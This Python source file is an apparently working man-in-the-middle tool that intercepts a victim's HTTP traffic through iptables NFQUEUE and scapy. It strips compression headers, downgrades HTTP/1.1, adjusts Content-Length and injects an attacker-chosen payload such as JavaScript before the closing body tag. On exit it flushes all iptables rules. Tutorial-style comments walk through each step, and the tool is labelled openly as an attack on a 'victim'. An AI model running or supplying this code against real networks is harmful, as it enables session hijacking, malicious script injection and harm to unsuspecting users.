#!/usr/bin/env python3

import os
import time
import netfilterqueue
import subprocess
import argparse
import scapy.all as scapy
from functools import partial
from colorama import init, Fore
from halo import Halo
import sys
import re


# First we need to know well what we are doing,
# We have our arp_spoof so,
# we can capture the traffic between the victim and the gateway.
# We now need to intercept these packets and modify them first before it arrives its destination.
# scapy help us to :
# 1. create packets
# 2. analyze packets
# 3. send/receive packets
# but not INTERCEPT packets
# Our main goal is to capture the packet, modify it, transmit our modified version .
# To achieve that we need to make a trap that will delay the real version of the packet,
# so our modified version will be sent and processed first.
# To create that trap we need to create a queue and trap in it the original packets.
# So we will use a tool called iptables to modify the routing rules.


def create_forward_chain_rule(interface):
    create_rule = ["sudo", "iptables", "-I", "FORWARD", "-i",
                   interface, "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(create_rule)


""""
The  command inserts a rule into the FORWARD chain of the firewall configuration
and specifically applies it to the given interface. Let's break down the command and its implications:

1. iptables: The command-line tool used for configuring the netfilter firewall rules in the Linux kernel.

2.-I: Indicates that we want to insert a new rule into the chain.

3. FORWARD: Specifies the name of the chain where the rule will be inserted. In this case,
 it is the FORWARD chain responsible for forwarding packets between different network interfaces.

4. -i : Specifies the input interface to which the rule will apply.

5. -j NFQUEUE: Specifies the target of the rule. It sets the target to NFQUEUE,
indicating that packets matching this rule will be sent to a userspace queue for further processing.

6. --queue-num 0: Specifies the queue number to which the packets will be sent.
In this case, the queue number is set to 0.

With this command, any packets that are forwarded through the FORWARD chain and match
the input interface will be redirected to the specified userspace queue (0) for further
processing by a userspace program.

Note that this will only trap the coming traffic from other devices,
To make it trap the traffic on your device so you need to create rules
for the  OUTPUT and INPUT chains .
"""


# ---------------------------------------------------------------
#                    On The Local Machine
# ---------------------------------------------------------------
def create_input_chain_rule():
    command = ["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


def create_output_chain_rule():
    command = ["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


# ---------------------------------------------------------------


def delete_chain_rules():
    command = ["sudo", "iptables", "--flush"]
    subprocess.run(command)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = u"This tool Intercepts the HTTP Responses, Injects them with the given payload," \
                   u" Then forward them to thier destination after they are modified." \
                   u"\nDeveloped By (BigTrader) \u2620\ufe0f"

    parser.add_argument("-l", "--local", dest="local", action="store_true",
                        help="if you are testing on your local machine or when using [bettercap]")

    parser.add_argument("-i", "--interface", dest="interface",
                        help="The interface you want to use in the attack", required=True)

    parser.add_argument("--payload", dest="payload",
                        help="The payload you want to inject", required=True)

    parser.add_argument("--port", dest="port",
                        help="The port that you will listen and transmit packets through,"
                             " (8080) if you are using [bettercap]", required=True)
    arguments = parser.parse_args()

    return arguments


# Creating a global spinner object for showing the progress of our script:
spinner = Halo(text="\nWaiting For The Target To Make A Request ...", spinner='dots')


# This function will modify the load of the Raw Layer in a given packet
def set_load(packet, new_load):
    packet[scapy.Raw].load = new_load
    # An important thing that we shouldn't miss, That we have to also modify the [ IP ] & [ TCP ] Layers
    # And we are interested in two main fields
    # 1. len    : Specifies the total length of the packet, including both the header and the payload.
    # 2. chksum : The receiving end can calculate the checksum to verify the integrity of the packet.
    packet[scapy.IP].len = None
    packet[scapy.IP].chksum = None
    packet[scapy.TCP].chksum = None

    # Recalculate the length and checksum fields
    packet = packet.__class__(bytes(packet))

    return packet


# In this program we need to replace the response that is coming to the victim, with our payload,
# May be a javascript code, html code or anything else
# So, As we are MITM, To achieve that we will edit the HTTP request that the victim made then forward it to the server,
# Then after receiving the response we will modify it (Raw Layer.load field) and send the modified version to the victim.
# This function will take the fake payload that we need to replace the actual payload with
number_of_injection_times = 0


def process_packet(payload, port, packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.Raw):
            load = scapy_packet[scapy.Raw].load
            injection_done = False
            if scapy_packet.haslayer(scapy.TCP):
                if scapy_packet[scapy.TCP].dport == int(port):
                    # The requests that are made have a header called "Accept-Encoding:" and its value is by default "gzip"
                    # The aim from this header is to tell the browser to send the data in a specific encoding,
                    # So in our case, The server understands that the browser can understand the gzip encoding,
                    # So it compresses the response before it send it to the browser.
                    # So, if we removed this header from the request, The server will send the data in its normal format
                    # So lets remove it:
                    # We will use the RegEx Module to remove the header form the request as follows:
                    # Remove the "Accept-Encoding" header
                    load = re.sub(r"Accept-Encoding[:\sa-z,(\\.)?]*", "", load.decode())
                    # We need also to downgrade any request that contains HTTP/1.1 to HTTP/1.0,
                    # As in HTTP/1.1 the data is transferred in chunks with a constant length
                    # So any modification will not work well, Lets just replace the word that defines that in the request:
                    load = load.replace("HTTP/1.1", "HTTP/1.0")
                    # Convert the modified payload back to bytes again as the re.sub will return str
                    load = load.encode()
                elif scapy_packet[scapy.TCP].sport == int(port):
                    # Converting the payload into bytes to inject in the load field
                    payload = payload.encode()
                    # Getting the size of our pyload to use ot latter
                    size_of_payload = len(payload)
                    # In the load headers, There is a header called "Content-Length", and simply this specifies the
                    # amount of data that the server intend to send to the browser so, If the browser found that the
                    # length of the data received is not equal to the specified Content-Length so, it will close the
                    # connection and the data won't be complete
                    # Lets modify process on this field
                    # First we need to get the Content-Length of each packet we capture, We will use the ReGex to do this:
                    # We will divide our regex into 2 groups one for the word "Content-Length" and the other for the numerical value
                    # We will use (?:...) non-capturing to tell the regex that we don't need this group, and we need group(1) only
                    if b"text/html" in load:
                        content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load.decode())
                        if content_length_search:
                            content_length = int(content_length_search.group(1))
                            new_content_length = content_length + size_of_payload
                            new_content_length_header = "Content-Length: " + str(new_content_length)
                            load = re.sub(r"Content-Length:\s\d*", new_content_length_header, load.decode())
                            # Convert the modified payload back to bytes again as the re.sub will return str
                            load = load.encode()
                    # Check if the load of the response contains the end of the html body (</body>) so,
                    # we will inject our code here
                    if b"</body>" in load:
                        # Now we are sure that the HTTP response load isn't encoded so the browser will receive it
                        # in its original format
                        # So, Lets do our job and inject the Raw.load with our payload
                        # Injecting a JS body:
                        load = load.replace(b"</body>", payload + b"</body>")
                        injection_done = True
                        global number_of_injection_times
                        number_of_injection_times += 1

            # After all that, if we found that the load that we captured at first isn't equal to the load of the packet,
            # That means that we have made our updates on the load so, We should set it into the packet
            if load != scapy_packet[scapy.Raw].load:
                if injection_done:
                    spinner.stop()
                    print("\r[", Fore.RED + str(number_of_injection_times), "] Injections Done ", u"\u2620\ufe0f")
                    spinner.start()
                scapy_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(scapy_packet))

    except UnicodeDecodeError:
        pass
    except Exception as e:
        spinner.stop()
        print(Fore.RED + "\n[-] ", "An unexpected error occurred while processing the packet: ", str(e))
    finally:
        packet.accept()


# This function will give time to wait for the response as if we didn't wait,
# The finding process may be slower
def waiting_for_response(capture_duration, queue):
    start_time = time.time()
    # This line sets up a while loop that will continue running as long as
    # the elapsed time (current time minus the start time) is less than the capture_duration.
    while time.time() - start_time < capture_duration:
        queue.run()
        time.sleep(0.1)


def main():
    arguments = get_arguments()
    local = arguments.local
    payload = arguments.payload
    interface = arguments.interface
    port = arguments.port

    if local:
        create_output_chain_rule()
        create_input_chain_rule()
    else:
        create_forward_chain_rule(interface)

    # Process the payload
    if os.path.isfile(payload):
        with open(payload, 'r') as payload_file:
            payload_content = payload_file.read()
    else:
        payload_content = payload

    try:
        spinner.start()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, partial(process_packet, payload_content, port))
        waiting_for_response(10, queue)
    except KeyboardInterrupt:
        delete_chain_rules()
        spinner.stop()
        print(Fore.RED + "\n[x] ", "Attack Stopped")
        sys.exit()

    except Exception as e:
        delete_chain_rules()
        spinner.stop()
        print(Fore.RED + "\n[-] ", f"An unexpected error occurred: {str(e)} ")


if __name__ == '__main__':
    main()

